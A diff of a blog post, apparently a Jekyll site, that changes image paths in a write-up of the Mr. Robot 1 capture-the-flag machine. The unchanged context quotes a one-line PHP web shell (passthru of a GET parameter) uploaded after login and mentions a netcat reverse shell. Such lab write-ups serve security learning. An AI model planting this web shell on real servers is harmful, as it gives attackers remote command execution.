@@ -37,13 +37,13 @@ I ran another nmap with “-p 1-65535” parameters on all ports, but nothing ch
 
 The website was the same on port 80 and 443:
 
-![Screenshot]({{ site.baseurl }}/images/posts/2016/2016-12-21-mr-robot-1-writeup/img1.png)
+![Screenshot]({{ site.baseurl }}/images/2016-12-21-mr-robot-1-writeup/img1.png)
 
 It was an animated console on a fsociety machine 😛
 
 But… look at this:
 
-![Screenshot]({{ site.baseurl }}/images/posts/2016/2016-12-21-mr-robot-1-writeup/img2.png)
+![Screenshot]({{ site.baseurl }}/images/2016-12-21-mr-robot-1-writeup/img2.png)
 
 First Key :
 
@@ -63,7 +63,7 @@ After logged in, I uploaded a php shell:
 <?php passthru($_GET[“cmd”]); ?>
 ~~~
 
-![Screenshot]({{ site.baseurl }}/images/posts/2016/2016-12-21-mr-robot-1-writeup/img3.png)
+![Screenshot]({{ site.baseurl }}/images/2016-12-21-mr-robot-1-writeup/img3.png)
 
 I got a reverse shell on netcat by using this payload:
 
